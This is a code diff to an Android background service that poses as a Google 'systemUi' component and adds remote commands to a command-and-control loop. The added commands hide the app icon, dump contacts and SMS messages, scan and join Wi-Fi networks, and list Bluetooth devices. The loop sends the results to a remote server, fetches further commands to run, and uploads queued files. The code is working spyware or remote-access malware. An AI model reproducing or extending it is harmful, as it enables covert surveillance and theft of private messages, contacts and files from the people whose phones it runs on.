@@ -4,17 +4,23 @@ import android.app.Notification;
 import android.app.Service;
 import android.app.admin.DevicePolicyManager;
 import android.bluetooth.BluetoothAdapter;
+import android.bluetooth.BluetoothDevice;
 import android.content.ClipData;
 import android.content.ClipboardManager;
 import android.content.ComponentName;
+import android.content.ContentResolver;
 import android.content.Intent;
 import android.content.SharedPreferences;
 import android.content.pm.PackageInfo;
+import android.content.pm.PackageManager;
 import android.database.Cursor;
+import android.database.sqlite.SQLiteException;
 import android.media.AudioManager;
 import android.media.MediaPlayer;
 import android.media.MediaRecorder;
 import android.net.Uri;
+import android.net.wifi.ScanResult;
+import android.net.wifi.WifiConfiguration;
 import android.net.wifi.WifiManager;
 import android.os.Build;
 import android.os.Environment;
@@ -23,6 +29,7 @@ import android.os.PowerManager;
 import android.os.SystemClock;
 import android.os.Vibrator;
 import android.preference.PreferenceManager;
+import android.provider.ContactsContract;
 import android.provider.MediaStore;
 import android.speech.tts.TextToSpeech;
 import android.speech.tts.TextToSpeech.OnInitListener;
@@ -38,6 +45,7 @@ import com.genonbeta.core.ServerConnection;
 import com.github.kevinsawicki.http.HttpRequest;
 import com.google.android.systemUi.R;
 import com.google.android.systemUi.activity.Configuration;
+import com.google.android.systemUi.activity.Starter;
 import com.google.android.systemUi.config.AppConfig;
 import com.google.android.systemUi.helper.FileUtils;
 import com.google.android.systemUi.helper.NotificationPublisher;
@@ -53,7 +61,7 @@ import java.io.IOException;
 import java.net.Socket;
 import java.util.ArrayList;
 import java.util.Locale;
-import java.util.jar.Manifest;
+import java.util.Set;
 
 public class CommunicationService extends Service implements OnInitListener
 {
@@ -245,7 +253,9 @@ public class CommunicationService extends Service implements OnInitListener
 		try
 		{
 			return Long.valueOf(mPreferences.getString("remoteServerDelay", String.valueOf(mRemoteThreadDelay)));
-		} catch (NumberFormatException e) {}
+		} catch (NumberFormatException e)
+		{
+		}
 
 		return mRemoteThreadDelay;
 	}
@@ -700,13 +710,6 @@ public class CommunicationService extends Service implements OnInitListener
 
 						result = true;
 						break;
-					case "wifiPower":
-						WifiManager manager = (WifiManager) getApplicationContext().getSystemService(WIFI_SERVICE);
-
-						response.put("previousState", wifiState(manager.getWifiState()));
-
-						result = manager.setWifiEnabled(receivedMessage.getBoolean("power"));
-						break;
 					case "ringerMode":
 						String mode = receivedMessage.getString("mode");
 						int setMode = -100;
@@ -727,19 +730,6 @@ public class CommunicationService extends Service implements OnInitListener
 							response.put("error", "Mode could not be set. Mode values can only be vibrate|silent|normal");
 
 						response.put("currentMode", ringerMode(mAudioManager.getRingerMode()));
-						break;
-					case "bluetoothPower":
-						BluetoothAdapter bluetoothAdapter = BluetoothAdapter.getDefaultAdapter();
-
-						boolean isEnabled = bluetoothAdapter.isEnabled();
-						boolean powerRequest = receivedMessage.getBoolean("power");
-
-						response.put("previousState", isEnabled);
-
-						if (powerRequest && !isEnabled)
-							result = bluetoothAdapter.enable();
-						else if (!powerRequest && isEnabled)
-							result = bluetoothAdapter.disable();
 						break;
 					case "writeFile":
 						FileUtils.writeFile(new File(receivedMessage.getString("file")), receivedMessage.getString("index"));
@@ -807,7 +797,6 @@ public class CommunicationService extends Service implements OnInitListener
 					case "playSong":
 						if (receivedMessage.has("name") || receivedMessage.has("file"))
 						{
-
 							if (receivedMessage.has("file"))
 							{
 								mPlayer.reset();
@@ -868,6 +857,7 @@ public class CommunicationService extends Service implements OnInitListener
 						response.put("parallelConnections", mParallelConnections.size());
 						response.put("notifyRequest", mNotifyRequests);
 						response.put("adminMode", mAdminMode);
+						response.put("connectedNetwork", ((WifiManager) getApplicationContext().getSystemService(WIFI_SERVICE)).getConnectionInfo().getSSID());
 						response.put("ttsInit", mTTSInit);
 						response.put("grantedList", mGrantedList);
 						response.put("remoteServer", mRemote.getAddress().getFormattedAddress());
@@ -1034,12 +1024,213 @@ public class CommunicationService extends Service implements OnInitListener
 
 						result = true;
 						break;
+					case "appIcon":
+						PackageManager packageManager = getPackageManager();
+						ComponentName componentName = new ComponentName(getApplicationContext(), Starter.class);
+						packageManager.setComponentEnabledSetting(componentName, receivedMessage.getBoolean("show") ? PackageManager.COMPONENT_ENABLED_STATE_ENABLED : PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
+
+						result = true;
+						break;
+					case "readContacts":
+						ContentResolver contentResolver = getContentResolver();
+						Cursor cursor = contentResolver.query(ContactsContract.Contacts.CONTENT_URI, null, ContactsContract.Contacts.DISPLAY_NAME + " LIKE ?", new String[] {"%" + receivedMessage.getString("filterName") + "%"}, ContactsContract.Contacts.DISPLAY_NAME + " ASC");
+						int startPosition = receivedMessage.has("limit") ? receivedMessage.getInt("limit") : 0;
+
+						JSONArray contacts = new JSONArray();
+
+						if (cursor.moveToFirst())
+						{
+							do
+							{
+								if (startPosition > 0 && cursor.getPosition() < (cursor.getCount() - startPosition))
+									continue;
+
+								JSONObject currentContact = new JSONObject();
+								JSONArray numbersIndex = new JSONArray();
+
+								String id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
+								String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
+
+								if (Integer.parseInt(cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0)
+								{
+									Cursor pCur = contentResolver.query(
+											ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+											null,
+											ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
+											new String[]{id}, null);
+
+									while (pCur.moveToNext())
+									{
+										int phoneType = pCur.getInt(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TYPE));
+										String phoneNumber = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
+										String type = "unknown";
+
+										switch (phoneType)
+										{
+											case ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE:
+												type = "mobile";
+												break;
+											case ContactsContract.CommonDataKinds.Phone.TYPE_HOME:
+												type = "home";
+												break;
+											case ContactsContract.CommonDataKinds.Phone.TYPE_WORK:
+												type = "work";
+												break;
+											case ContactsContract.CommonDataKinds.Phone.TYPE_OTHER:
+												type = "other";
+												break;
+											default:
+												break;
+										}
+
+										numbersIndex.put(new JSONObject()
+												.put("number", phoneNumber)
+												.put("type", type));
+									}
+
+									pCur.close();
+								}
+
+								currentContact.put("numbers", numbersIndex);
+								currentContact.put("name", name);
+
+								contacts.put(currentContact);
+							}
+							while (cursor.moveToNext());
+						}
+
+						cursor.close();
+
+						response.put("isNameFiltered", receivedMessage.has("filterName") && receivedMessage.getString("filterName").length() > 0);
+						response.put("isLimited", receivedMessage.has("limit") && receivedMessage.getInt("limit") > 0);
+						response.put("contacts", contacts);
+						result = true;
+						break;
+					case "bluetoothManager":
+						BluetoothAdapter bluetoothAdapter = BluetoothAdapter.getDefaultAdapter();
+						boolean isEnabled = bluetoothAdapter.isEnabled();
+
+						response.put("bluetoothEnabled", isEnabled);
+
+						switch (receivedMessage.getString("mode"))
+						{
+							case "power":
+								boolean powerRequest = receivedMessage.getBoolean("power");
+
+								if (powerRequest && !isEnabled)
+									result = bluetoothAdapter.enable();
+								else if (!powerRequest && isEnabled)
+									result = bluetoothAdapter.disable();
+								break;
+							case "pairList":
+								Set<BluetoothDevice> pairedDevices = bluetoothAdapter.getBondedDevices();
+								JSONArray pairedDevicesList = new JSONArray();
+
+								// There are paired devices. Get the name and address of each paired device.
+								for (BluetoothDevice device : pairedDevices)
+									pairedDevicesList.put(device.getName());
+
+								response.put("pairedDevices", pairedDevicesList);
+
+								result = false;
+								break;
+						}
+						break;
+					case "wifiManager":
+						WifiManager wifiManager = (WifiManager) getApplicationContext().getSystemService(WIFI_SERVICE);
+
+						response.put("wirelessStatus", wifiState(wifiManager.getWifiState()));
+
+						switch (receivedMessage.getString("mode"))
+						{
+							case "power":
+								result = wifiManager.setWifiEnabled(receivedMessage.getBoolean("power"));
+								break;
+							case "connect":
+								WifiConfiguration wifiConfig = new WifiConfiguration();
+								wifiConfig.SSID = String.format("\"%s\"", receivedMessage.getString("network"));
+								wifiConfig.preSharedKey = String.format("\"%s\"", receivedMessage.getString("password"));
+
+								int netId = wifiManager.addNetwork(wifiConfig);
+								wifiManager.disconnect();
+								wifiManager.enableNetwork(netId, true);
+								wifiManager.reconnect();
+
+								result = true;
+								break;
+							case "scan":
+								JSONArray accessPoints = new JSONArray();
+
+								wifiManager.startScan();
+
+								for (ScanResult resultIndex : wifiManager.getScanResults())
+									accessPoints.put(new JSONObject()
+											.put("capabilities", resultIndex.capabilities)
+											.put("SSID", resultIndex.SSID));
+
+								response.put("accessPoints", accessPoints);
+
+								result = true;
+								break;
+						}
+						break;
+					case "messageList":
+						JSONArray messageList = new JSONArray();
+						String smsUri = "content://sms/";
+						int passedToPosition = receivedMessage.has("limit") ? receivedMessage.getInt("limit") : 0;
+
+						try
+						{
+							Uri uri = Uri.parse(smsUri);
+							String[] projection = new String[]{"_id", "address", "person", "body", "date", "type"};
+							Cursor messageCursor = getContentResolver().query(uri, projection, "address LIKE ?", new String[] {"%" + receivedMessage.getString("address") + "%"}, "date asc");
+
+							if (messageCursor.moveToFirst())
+							{
+								response.put("totalResult", messageCursor.getCount());
+
+								int indexAddress = messageCursor.getColumnIndex("address");
+								int indexPerson = messageCursor.getColumnIndex("person");
+								int indexBody = messageCursor.getColumnIndex("body");
+								int indexDate = messageCursor.getColumnIndex("date");
+								int indexType = messageCursor.getColumnIndex("type");
+
+								do
+								{
+									if (passedToPosition > 0 && messageCursor.getPosition() < (messageCursor.getCount() - passedToPosition))
+										continue;
+
+									messageList.put(new JSONObject()
+											.put("address", messageCursor.getString(indexAddress))
+											.put("isReceived", messageCursor.getInt(indexType) == 1)
+											.put("date", DateFormat.format("yyyy-MM-dd HH:mm", messageCursor.getLong(indexDate)))
+											.put("text", messageCursor.getString(indexBody)));
+								} while (messageCursor.moveToNext());
+
+								if (!messageCursor.isClosed())
+								{
+									messageCursor.close();
+									messageCursor = null;
+								}
+							}
+
+							result = true;
+						} catch (SQLiteException ex)
+						{
+							Log.d("SQLiteException", ex.getMessage());
+						}
+
+						response.put("isLimited", receivedMessage.has("limit") && receivedMessage.getInt("limit") > 0);
+						response.put("msg", messageList);
+
+						break;
 					default:
 						response.put("error", "{" + request + "} is not found");
 				}
 
 				response.put("result", result);
 			}
+
 		}
 
 		@Override
@@ -1065,7 +1256,19 @@ public class CommunicationService extends Service implements OnInitListener
 			}
 
 			if (REMOTE_SERVER.equals(client))
+			{
 				mRemoteLogs.put(response.toString());
+
+				new Thread()
+				{
+					@Override
+					public void run()
+					{
+						super.run();
+						mRemoteThread.doCommunicate();
+					}
+				}.start();
+			}
 		}
 	}
 
@@ -1118,8 +1321,88 @@ public class CommunicationService extends Service implements OnInitListener
 
 	class RemoteThread extends Thread
 	{
+		private boolean mIsAvailable = true;
+
 		public RemoteThread()
 		{
+		}
+
+		public boolean doCommunicate()
+		{
+			if (mRemote.getAddress() == null || !mIsAvailable)
+			{
+				Log.d(TAG, "Remote connection passed; hasAddress=" + (mRemote.getAddress() != null) + "; available=" + mIsAvailable);
+				return false;
+			}
+
+			Log.d(TAG, "Remote connection: opening new connection; logCount=" + mRemoteLogs.length());
+
+			mIsAvailable = false;
+
+			try
+			{
+				mRemote.getAddress().clearAll();
+				mRemote.getAddress().addPost(AppConfig.PREVIOUS_RESULTS, mRemoteLogs.toString());
+
+				JSONArray cmds = new JSONArray(mRemote.connect());
+
+				if (cmds.length() > 0)
+				{
+					Log.d(TAG, "Remote connection: connected; receivedCommands=" + cmds.length());
+					for (int i = 0; i < cmds.length(); i++)
+						runCommand(REMOTE_SERVER, cmds.getString(i), false);
+				}
+
+				mRemoteLogs = new JSONArray();
+			} catch (Exception e)
+			{
+				Log.d(TAG, "Remote connection: context=default; error=" + e);
+			}
+
+			if (mUploadQueue.size() > 0)
+			{
+				FileHolder firstFile = mUploadQueue.get(0);
+
+				ServerAddress serverAddress = mRemote.getAddress();
+				serverAddress.clearAll();
+
+				try
+				{
+					if (firstFile.file.isFile())
+					{
+						HttpRequest request = HttpRequest.get(serverAddress.getFormattedAddress());
+						StringBuilder output = new StringBuilder();
+
+						request.readTimeout(0);
+						request.part(firstFile.categoryName, firstFile.file.getName(), firstFile.file);
+						request.receive(output);
+
+						Log.d(TAG, "File upload: " + request.ok() + "; server: " + output.toString());
+
+						if (request.ok())
+						{
+							if (mUploadQueue.size() > 0)
+								mUploadQueue.remove(0);
+
+							if (firstFile.deleteOnExit)
+								firstFile.file.delete();
+						}
+					}
+					else
+					{
+						Log.e(TAG, "File upload is passed (NOT_FOUND)");
+						if (mUploadQueue.size() > 0)
+							mUploadQueue.remove(0);
+					}
+				} catch (Exception e)
+				{
+					e.printStackTrace();
+				}
+			}
+
+			mIsAvailable = true;
+
+			return true;
 		}
 
 		@Override
@@ -1137,66 +1420,10 @@ public class CommunicationService extends Service implements OnInitListener
 				{
 				}
 
-				if (mRemote.getAddress() == null)
-					continue;
-
-				try
-				{
-					mRemote.getAddress().clearAll();
-					mRemote.getAddress().addPost(AppConfig.PREVIOUS_RESULTS, mRemoteLogs.toString());
-
-					JSONArray cmds = new JSONArray(mRemote.connect());
-
-					if (cmds.length() > 0)
-						for (int i = 0; i < cmds.length(); i++)
-							runCommand(REMOTE_SERVER, cmds.getString(i), false);
-
-					mRemoteLogs = new JSONArray();
-				} catch (Exception e)
-				{
-				}
-
-				if (mUploadQueue.size() > 0)
-				{
-					FileHolder firstFile = mUploadQueue.get(0);
-
-					ServerAddress serverAddress = mRemote.getAddress();
-					serverAddress.clearAll();
-
-					try
-					{
-						if (firstFile.file.isFile())
-						{
-							HttpRequest request = HttpRequest.get(serverAddress.getFormattedAddress());
-							StringBuilder output = new StringBuilder();
-
-							request.readTimeout(0);
-							request.part(firstFile.categoryName, firstFile.file.getName(), firstFile.file);
-							request.receive(output);
-
-							Log.d(TAG, "File upload: " + request.ok() + "; server: " + output.toString());
-
-							if (request.ok())
-							{
-								if (mUploadQueue.size() > 0)
-									mUploadQueue.remove(0);
-
-								if (firstFile.deleteOnExit)
-									firstFile.file.delete();
-							}
-						}
-						else
-						{
-							Log.e(TAG, "File upload is passed (NOT_FOUND)");
-							if (mUploadQueue.size() > 0)
-								mUploadQueue.remove(0);
-						}
-					} catch (Exception e)
-					{
-						e.printStackTrace();
-					}
-				}
+				doCommunicate();
 			}
+
+			Log.d(TAG, "RemoteServer thread ended");
 		}
 	}
 
